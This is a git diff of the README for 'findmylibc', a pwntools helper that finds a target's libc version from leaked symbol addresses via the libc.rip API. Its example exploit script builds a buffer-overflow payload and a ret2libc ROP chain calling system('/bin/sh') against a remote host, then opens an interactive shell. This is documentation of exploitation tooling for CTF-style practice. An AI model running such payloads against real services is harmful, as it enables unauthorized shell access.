@@ -10,24 +10,40 @@ This was tested only on 32-bit binary, so it might not work properly on 64-bit b
 Would be updated!
 
 # Setup
-```
+```bash
 pip install findmylibc
 ```  
 Then use easily:  
-```
+```python
 from findmylibc import *
 ...
 matching_libc = find_libc(elf, leak_libc_address)
 ```    
 
-See below the example.
+# The `find_libc` parameters
+## `elf`:
+An object of the class `ELF` from `pwntools`, usually created by calling: 
+```python
+ELF('binary-name')
+```
+
+## `leak_libc_address`:
+A function with signature of:  
+```python
+def my_leak_func(symbol_name_str): ... ->  return leaked_address_integer
+```  
+You must create this function,  
+where the only parameter is of type **string** - the symbol name to leak,  
+and the return value is the leaked address as **integer**.
+
+There's another optional argument, see [stop_libs_amount](#The-stop_libs_amount-argument-(optional)).
 
 # Example
-Here's a simple example of exploit script (see [`.example/example.py`](https://github.com/omrina/FindMyLibc/blob/main/example/example.py)).
+Here's a simple example of an exploit script (see [`.example/example.py`](https://github.com/omrina/FindMyLibc/blob/main/example/example.py)).
 
 ### Setup your binary exploit script:
 Whatever you need here...
-```
+```python
 from pwn import *
 from FindMyLibc import *
 
@@ -38,9 +54,9 @@ port = int(args.PORT or 5555)
 io = connect(host, port)
 ```
 
-### We need to set up a "leak address" function:
+### Set up our "leak address" function:
 
-```
+```python
 # Payload until right before the return address
 payload = b'A' * 512 + b'BBBBCCCCDDDD'
 
@@ -56,7 +72,7 @@ def leak_libc_address(symbol_name):
     return u64(received.ljust(8, b"\x00"))
 ```
 ### Now the real deal:
-```
+```python
 # call `find_libc`, it returns a list of matching libc candidates.
 matching_libc = find_libc(elf, leak_libc_address)
 chosen_libc = matching_libc[0]
@@ -77,13 +93,15 @@ The output from `.example/example.py`:
 ![image](https://github.com/user-attachments/assets/dfd95d72-e202-4d59-9e44-fcfd4d01eccd)
 
 
-What is `chosen_lib`:
+### What is `chosen_lib`:
 
 ![image](https://github.com/user-attachments/assets/06ff78eb-f59b-4ba6-b199-079e0e091781)
 
 ### How to use the results:
-You would probably need only `syms`, each value is the integer of the calcualted address, so you can use it like:
-```
+You would probably need only `syms`, a dict of `{symbol_name_str: calcualted_address_integer}`,  
+so continuing the example above, one might use:
+```python
+# Remember: chosen_libc['syms']['system'] AND chosen_libc['syms']['str_bin_sh']
 shell_rop = p32(system_address) + b'EEEE' + p32(binsh_address)
 io.send(payload + shell_rop)
 io.interactive()
@@ -91,17 +109,21 @@ io.interactive()
 
 # How does it work?
 The finder leaks the address of common symbols:  
-`_common_symbols_to_leak = ['__libc_start_main', 'puts', 'printf', 'gets', 'read', 'write', 'send', 'recv']`  
+```python
+_common_symbols_to_leak = ['__libc_start_main', 'puts', 'printf', 'gets', 'read', 'write', 'send', 'recv']
+```  
 Then it makes reqeusts to the public `https://libc.rip/api/find`, with different combination of leaked symbols every time.  
 
 E.g.- we send a request with `{'puts': 'leaked-address-of-puts', 'gets': 'leaked-address-of-gets'}`.  
 A response would be a list of matching libc versions metadata (each item is like a part of `chosen_lib` seen earlier).
 
-## The `stop_libs_amount` argument
+## The `stop_libs_amount` argument (optional)
 The `find_libc` function has a `stop_libs_amount` argument with default of `3`,  
 meaning- if we reach 3 matching libc versions, it's enough and we stop searching.  
 
 You can change it if you'd like to:  
-`matching_libc = find_libc(elf, leak_libc_address, stop_libs_amount=2)`
+```python
+matching_libc = find_libc(elf, leak_libc_address, stop_libs_amount=2)
+```
 
 
